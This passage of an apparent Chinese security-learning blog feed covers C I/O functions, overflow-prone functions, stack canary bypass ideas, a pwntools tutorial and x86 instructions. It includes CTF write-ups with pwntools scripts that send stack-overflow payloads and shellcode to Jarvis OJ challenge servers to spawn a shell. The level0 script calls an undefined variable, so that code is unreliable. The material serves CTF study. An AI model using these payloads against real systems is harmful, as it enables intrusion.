失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。</p><h3 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h3><p>type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。<br>command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open&quot;&gt;&lt;a href=&quot;#open&quot; class=&quot;headerlink&quot; title=&quot;open&quot;&gt;&lt;/a&gt;open&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>缓冲文件系统和非缓冲文件系统</title>
    <link href="https://nocbtm.github.io/2018/11/05/%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%92%8C%E9%9D%9E%E7%BC%93%E5%86%B2%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>https://nocbtm.github.io/2018/11/05/缓冲文件系统和非缓冲文件系统/</id>
    <published>2018-11-05T10:31:52.000Z</published>
    <updated>2019-10-01T08:30:17.631Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将缓冲文件系统扩充为可以处理二进制文件。</p><h2 id="缓冲文件系统"><a href="#缓冲文件系统" class="headerlink" title="缓冲文件系统"></a>缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数-1"><a href="#代表函数-1" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;1983 年ANSI C 标准决定不采用非缓冲文件系统，而只采用缓冲文件系统。即用缓冲文件系统处理文本文件，也用它来处理二进制文件。也就是将
      
    
    </summary>
    
      <category term="linux" scheme="https://nocbtm.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nocbtm.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出常见函数</title>
    <link href="https://nocbtm.github.io/2018/11/04/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2018/11/04/栈溢出常见函数/</id>
    <published>2018-11-04T11:17:08.000Z</published>
    <updated>2019-10-01T08:27:33.168Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-read"><a href="#0x00-read" class="headerlink" title="0x00 read()"></a>0x00 read()</h2><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t read (int fd, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为0从键盘读取<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要读入文件指定的字节数；</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.<br>小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p><h2 id="0x01-write"><a href="#0x01-write" class="headerlink" title="0x01 write()"></a>0x01 write()</h2><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t write(int fd,const void *buf,size_t nbytes)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为1输出到显示器<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要写入文件指定的字节数；</p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>如果顺利write()会返回实际写入的字节数.<br>当有错误发生时则返回-1, 错误代码存入errno 中.</p><p>错误代码：</p><ul><li>EINTR 此调用被信号所中断.</li><li>EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</li><li>EADF 参数fd 非有效的文件描述词, 或该文件已关闭</li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets()"></a>0x02 gets()</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line">char *gets(char *str);</span><br></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了</p><p>gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。</p><h2 id="0x03-strcpy-和memcpy-和strncpy"><a href="#0x03-strcpy-和memcpy-和strncpy" class="headerlink" title="0x03 strcpy()和memcpy()和strncpy()"></a>0x03 strcpy()和memcpy()和strncpy()</h2><h3 id="函数原型-3"><a href="#函数原型-3" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char* strcpy(char* dest, const char* src)</span><br><span class="line">void *memcpy( void *dest, const void *src, size_t count );</span><br><span class="line">char *strncpy(char *dest,char *src,int size_t n);</span><br></pre></td></tr></table></figure><p>dest:指向用于存储复制内容的目标数组。<br>src:要复制的字符串。<br>count：要读入文件指定的字节数；</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。</li><li>复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。</li><li>复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。</li><li>用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</li><li>strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节</li></ul><h2 id="0x04-printf-和scanf"><a href="#0x04-printf-和scanf" class="headerlink" title="0x04 printf()和scanf()"></a>0x04 printf()和scanf()</h2><h3 id="scanf函数"><a href="#scanf函数" class="headerlink" title="scanf函数"></a>scanf函数</h3><p>scanf(“%d %d”,&amp;a,&amp;b);<br>遇到空格(0x20)停止读取</p><h3 id="printf函数"><a href="#printf函数" class="headerlink" title="printf函数"></a>printf函数</h3><p>printf(“%s”, i);<br>输出直到\x00</p><h3 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h3><p>通常来说，我们会使用printf([格式化字符串]，参数)的形式来进行调用，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char s[20] = “Hello world!\n”;</span><br><span class="line">printf(“%s”, s);</span><br></pre></td></tr></table></figure></p><p>然而，有时候为了省事也会写成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char s[20] = “Hello world!\n”;</span><br><span class="line">printf(s);</span><br></pre></td></tr></table></figure></p><p>事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-read&quot;&gt;&lt;a href=&quot;#0x00-read&quot; class=&quot;headerlink&quot; title=&quot;0x00 read()&quot;&gt;&lt;/a&gt;0x00 read()&lt;/h2&gt;&lt;h3 id=&quot;函数原型&quot;&gt;&lt;a href=&quot;#函数原型&quot; class=&quot;head
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>stack canary绕过思路</title>
    <link href="https://nocbtm.github.io/2018/10/24/stack-canary%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://nocbtm.github.io/2018/10/24/stack-canary绕过思路/</id>
    <published>2018-10-24T10:59:43.000Z</published>
    <updated>2019-10-01T08:38:39.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-canary保护机制"><a href="#0x00-canary保护机制" class="headerlink" title="0x00 canary保护机制"></a>0x00 canary保护机制</h2><p>我们知道，通常栈溢出的利用方式是通过溢出存在于栈上的局部变量，从而让多出来的数据覆盖ebp、eip等，从而达到劫持控制流的目的。然而stack canary这一技术的应用使得这种利用手段变得难以实现。</p><p>canary保护机制是在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的canary值（最后两位必须是00），栈帧销毁前测试该值是否“死掉”，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。</p><p>如图var-c就是canary的地址，如果触发了栈溢出漏洞，还不知道canary的值，就会执行__stack_chk_fail函数。<br><img alt="" data-src="https://i.imgur.com/0XkugWG.png" class="lozad"><br><img alt="" data-src="https://i.imgur.com/iXZEDP4.png" class="lozad"></p><h2 id="0x01-泄露canary"><a href="#0x01-泄露canary" class="headerlink" title="0x01 泄露canary"></a>0x01 泄露canary</h2><p>泄露canary的方法有：</p><ul><li>通过格式化字符串漏洞来泄露canary的值</li><li>通过栈溢出漏洞来泄露canary的值</li><li>多进程程序的canary爆破</li><li>利用__stack_chk_fail函数泄露信息<br>当然具体问题还要具体分析</li></ul><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-canary保护机制&quot;&gt;&lt;a href=&quot;#0x00-canary保护机制&quot; class=&quot;headerlink&quot; title=&quot;0x00 canary保护机制&quot;&gt;&lt;/a&gt;0x00 canary保护机制&lt;/h2&gt;&lt;p&gt;我们知道，通常栈溢出的利用方式是通过
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>oj level0和level1总结</title>
    <link href="https://nocbtm.github.io/2018/09/21/oj-level0%E5%92%8Clevel1%E6%80%BB%E7%BB%93/"/>
    <id>https://nocbtm.github.io/2018/09/21/oj-level0和level1总结/</id>
    <published>2018-09-21T11:42:51.000Z</published>
    <updated>2019-10-01T08:40:47.439Z</updated>
    
    <content type="html"><![CDATA[<p>做题之前，需要知道pwntools的基本用法，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure></p><p>ps：具体的可以看我的另一篇博客</p><p>还需要知道pwn的一般套路，这里我只说说栈溢出的基本套路：</p><ul><li>找到栈溢出地址（就是搞事情的地址），基本上都是buf的地址，这个地址需要用pwntools中的p32或p64进行转换，（若程序是32位的就用p32）才能用pwntools中的sendline发送到远程连接</li><li>构建shellcode，用一句话就行shellcode = asm(shellcraft.sh())</li><li>构建payload，payload的基本构建：payload=shellcode+’a’*一个长度+p32(buf_addr)，次序一定不能乱</li><li>最后就可以发送payload，进行交互，得到shell的控制权，然后ls ，cat flag<img alt="" data-src="https://i.imgur.com/rCwB8hx.png" class="lozad"></li></ul><h2 id="level0的脚本如下："><a href="#level0的脚本如下：" class="headerlink" title="level0的脚本如下："></a>level0的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">s_addr=0x400596</span><br><span class="line">r=remote(&quot;pwn2.jarvisoj.com&quot;,9881)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>解释如下：<br>level0是最简单的也是最基本的，这个题有一个函数callsystem，直接返回一个system（”/bin/sh”)也就是返回一个命令框，这就是我们想要的，所以不用构建shellcode和paload了<br><img alt="" data-src="https://i.imgur.com/XZRbADf.png" class="lozad"><br>脚本里的’a’<em>0x80+’a’</em>8代表的是如下图的两个数据，0x80是申请的总共地址，而8在buf的最下方<img alt="" data-src="https://i.imgur.com/tHfJ9kZ.png" class="lozad"><br><img alt="" data-src="https://i.imgur.com/HRyGj3Z.png" class="lozad"></p><p>s_addr=0x400596代表的是函数callsystem的地址<img alt="" data-src="https://i.imgur.com/DDtBv0g.png" class="lozad"></p><h2 id="level1的脚本如下："><a href="#level1的脚本如下：" class="headerlink" title="level1的脚本如下："></a>level1的脚本如下：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io = remote(&apos;pwn2.jarvisoj.com&apos;, 9877)</span><br><span class="line">text = io.recvline()[14: -2]</span><br><span class="line"></span><br><span class="line">buf_addr = int(text, 16)</span><br><span class="line"></span><br><span class="line">payload = shellcode + &apos;a&apos; * (0x88 + 0x4 - len(shellcode)) + p32(buf_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>解释如下：<br>这里我只解释主要思路不明白如下两句话的可以百度<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context(log_level = &apos;debug&apos;, arch = &apos;i386&apos;, os = &apos;linux&apos;)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></p><p>[14:-2]只是python里面的一个切片，代表”What’sthis:0xffee6c50?”<br>这句话取第14个到倒数第二个字符<br>这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;做题之前，需要知道pwntools的基本用法，如下：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span cla
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwntools</title>
    <link href="https://nocbtm.github.io/2018/09/19/pwntools/"/>
    <id>https://nocbtm.github.io/2018/09/19/pwntools/</id>
    <published>2018-09-19T13:32:24.000Z</published>
    <updated>2019-10-01T08:39:17.277Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的编写exploit。<br>python2安装方法： sudo pip install pwntools<br>python3安装方法： sudo pip3 install pwntools</p><h2 id="IO模块"><a href="#IO模块" class="headerlink" title="IO模块"></a>IO模块</h2><p>下面给出了PwnTools中的主要IO函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">send(data) : 发送数据</span><br><span class="line">sendline(data) : 发送一行数据，相当于在末尾加\n</span><br><span class="line"></span><br><span class="line">recv(numb=4096, timeout=default) : 给出接收字节数,timeout指定超时</span><br><span class="line">recvuntil(delims, drop=False) : 接收到delims的pattern</span><br><span class="line">（以下可以看作until的特例）</span><br><span class="line">recvline(keepends=True) : 接收到\n，keepends指定保留\n</span><br><span class="line">recvall() : 接收到EOF</span><br><span class="line">recvrepeat(timeout=default) : 接收到EOF或timeout</span><br><span class="line"></span><br><span class="line">interactive() : 与shell交互</span><br></pre></td></tr></table></figure></p><h2 id="ELF模块"><a href="#ELF模块" class="headerlink" title="ELF模块"></a>ELF模块</h2><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很相似。</p><p>下面演示了：获取基地址、获取函数地址（基于符号）、获取函数got地址、获取函数plt地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址</span><br><span class="line">0x401680</span><br></pre></td></tr></table></figure></p><h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><p>主要是对整数进行打包，就是转换成二进制的形式，比如转换成地址。p32、p64是打包，u32、u64是解包。<br>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便</p><p>用法: </p><ul><li>p32/p64: 打包一个整数,分别打包为32或64位 </li><li>u32/u64: 解包一个字符串,得到整数</li></ul><h2 id="大致框架"><a href="#大致框架" class="headerlink" title="大致框架"></a>大致框架</h2><p>官网的一个简单样例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &apos;i386&apos;, os = &apos;linux&apos;)   ;设置目标机的信息</span><br><span class="line"></span><br><span class="line">r = remote(&apos;exploitme.example.com&apos;, 31337)  ;用来建立一个远程连接，url或者ip作为地址</span><br><span class="line">                                  然后指明端口,这里也可以仅仅使用本地文件,调试时方便:</span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))       ;r.send()将shellcode发送到远程连接</span><br><span class="line"></span><br><span class="line">r.interactive()                    ;将控制权交给用户，这样就可以使用打开的shell了</span><br></pre></td></tr></table></figure><h2 id="Context设置"><a href="#Context设置" class="headerlink" title="Context设置"></a>Context设置</h2><p>context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。</p><p>一般来说我们设置context只需要简单的一句话:</p><p>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p><p>这句话的意思是： </p><ol><li>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux </li><li>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ </li><li>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</li></ol><h2 id="汇编与shellcode"><a href="#汇编与shellcode" class="headerlink" title="汇编与shellcode"></a>汇编与shellcode</h2><p>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：</p><p>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(shellcraft.sh()) # 打印出shellcode</span><br></pre></td></tr></table></figure></p><p>不过，现在我们看到的shellcode还是汇编代码，不是能用的机器码，所以还需要进行一次汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(asm(shellcraft.sh())) # 打印出汇编后的shellcode</span><br></pre></td></tr></table></figure></p><p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。如果需要更复杂一些的汇编功能，可以使用keystone-engine项目，这里就不再赘述了。</p><p>asm也是架构相关，所以一定要先设置context，避免一些意想不到的错误。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;pwntools&quot;&gt;&lt;a href=&quot;#pwntools&quot; class=&quot;headerlink&quot; title=&quot;pwntools&quot;&gt;&lt;/a&gt;pwntools&lt;/h2&gt;&lt;p&gt;pwntools是一个ctf框架和漏洞利用开发库，用python开发，旨在让使用者简单快速的
      
    
    </summary>
    
      <category term="pwntools" scheme="https://nocbtm.github.io/categories/pwntools/"/>
    
    
      <category term="pwntools" scheme="https://nocbtm.github.io/tags/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>cmp指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/cmp%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/cmp指令/</id>
    <published>2018-09-16T08:16:31.000Z</published>
    <updated>2019-10-01T08:41:49.139Z</updated>
    
    <content type="html"><![CDATA[<p>cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。<br>cmp指令格式：cmp操作对象1，操作对象2<br>功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。</p><p>指令cmp ax，bx的逻辑含义是比较ax，bx中的值，如果执行后：<br>zf=1，说明(ax)=(bx)<br>zf=0，说明（ax）不等于（bx）<br>cf=1，说明（ax）&lt;(bx)<br>cf=0，说明（ax)&gt;=(bx)<br>cf=0且zf=0，说明（ax）&gt;(bx)<br>cf=1或zf=1,说明(ax)&lt;=(bx）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;cmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。&lt;br&gt;cmp指令格式：cmp操作对象1，操作对象2&lt;br&gt;功能：计算操作对象1-操作对象2但不保存结果，仅仅根据计算结果对标志寄存器进行设置。&lt;/p&gt;
&lt;p&gt;指令cmp ax，bx的逻辑含义是比较ax，bx中的
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>sbb指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/sbb%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/sbb指令/</id>
    <published>2018-09-16T08:16:16.000Z</published>
    <updated>2019-10-01T08:38:49.585Z</updated>
    
    <content type="html"><![CDATA[<p>sbb是带减法指令，它利于了CF位上记录的错位置。<br>指令格式：sbb 操作对象1，操作对象2<br>功能：操作对象1=操作对象1-操作对象2-CF<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ax,003EH</span><br><span class="line">sub bx,2000H</span><br><span class="line">sbb ax,0020H</span><br></pre></td></tr></table></figure></p><p>sbb指令执行后，将对CF进行设置。利用sbb指令可以对任意大的数据进行减法运算。上面程序，就是计算003E1000H-00202000H</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;sbb是带减法指令，它利于了CF位上记录的错位置。&lt;br&gt;指令格式：sbb 操作对象1，操作对象2&lt;br&gt;功能：操作对象1=操作对象1-操作对象2-CF&lt;br&gt;例如：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="汇编语言" scheme="https://nocbtm.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>adc指令</title>
    <link href="https://nocbtm.github.io/2018/09/16/adc%E6%8C%87%E4%BB%A4/"/>
    <id>https://nocbtm.github.io/2018/09/16/adc指令/</id>
    <published>2018-09-16T06:52:54.000Z</published>
    <updated>2019-10-01T08:44:27.604Z</updated>
    
